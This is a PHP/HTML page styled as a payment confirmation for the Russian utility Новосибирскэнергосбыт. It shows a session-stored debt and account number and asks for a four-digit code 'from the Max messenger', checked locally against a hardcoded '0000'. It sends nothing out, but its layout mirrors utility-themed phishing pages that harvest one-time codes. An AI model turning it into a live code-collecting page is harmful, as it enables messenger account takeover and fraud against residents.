<?php
session_start();

if (!isset($_SESSION['debt'], $_SESSION['account_number'], $_SESSION['district'])) {
    header('Location: index.html');
    exit;
}

$debt           = $_SESSION['debt'];
$account_number = $_SESSION['account_number'];
$district       = $_SESSION['district'];
?>
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Подтверждение оплаты — Новосибирскэнергосбыт</title>
    <link rel="stylesheet" href="style.css">
    <style>
        .sms-page {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 60vh;
            padding: 40px 20px;
        }
        .sms-card {
            border: black solid 1px;
            padding: 50px 60px;
            max-width: 500px;
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 20px;
        }
        .sms-card h2 {
            font-size: 28px;
            font-weight: bold;
            text-align: center;
            margin: 0;
        }
        .sms-info {
            font-size: 18px;
            text-align: center;
            color: #444;
        }
        .sms-debt {
            font-size: 36px;
            font-weight: bold;
            text-align: center;
        }
        .sms-label {
            font-size: 16px;
            color: #666;
            text-align: center;
        }
        .sms-card .forma {
            width: 200px;
            letter-spacing: 8px;
            font-size: 24px;
            text-align: center;
        }
        .sms-submit {
            background-color: black;
            color: white;
            padding: 15px 40px;
            border-radius: 10px;
            font-weight: bold;
            font-size: 20px;
            cursor: pointer;
        }
        .sms-back {
            font-size: 16px;
            color: #666;
            text-decoration: underline;
            cursor: pointer;
            background: none;
            border: none;
        }
        .sms-error {
            color: red;
            font-size: 16px;
            display: none;
        }
    </style>
</head>
<body>
    <header class="site-header">
        <div class="logo-area">
            <img src="images/logo.png" alt="Логотип" class="logo-img">
            <span class="logo-text">Новосибирскэнергосбыт</span>
        </div>
    </header>
    <main class="sms-page">
        <div class="sms-card">
            <h2>Подтверждение оплаты</h2>
            <div class="sms-info">
                Район: <strong><?= htmlspecialchars($district) ?></strong><br>
                Лицевой счёт: <strong><?= htmlspecialchars($account_number) ?></strong>
            </div>
            <div class="sms-label">Сумма задолженности</div>
            <div class="sms-debt"><?= number_format((float)$debt, 2, ',', ' ') ?> ₽</div>
            <div class="sms-info">Введите код из мессенджера Макс</div>
            <input class="forma" type="text" id="smsCode" maxlength="4" placeholder="_ _ _ _" autocomplete="one-time-code">
            <div class="sms-error" id="smsError">Неверный код. Попробуйте ещё раз.</div>
            <button class="sms-submit" onclick="confirmSms()">Подтвердить</button>
            <a href="index.html" class="sms-back">Вернуться на главную</a>
        </div>
    </main>
    <script>
        function confirmSms() {
            const code = document.getElementById('smsCode').value.trim();
            if (code === '0000') {
                window.location.href = 'payment.html';
            } else {
                document.getElementById('smsError').style.display = 'block';
            }
        }
    </script>
</body>
</html>
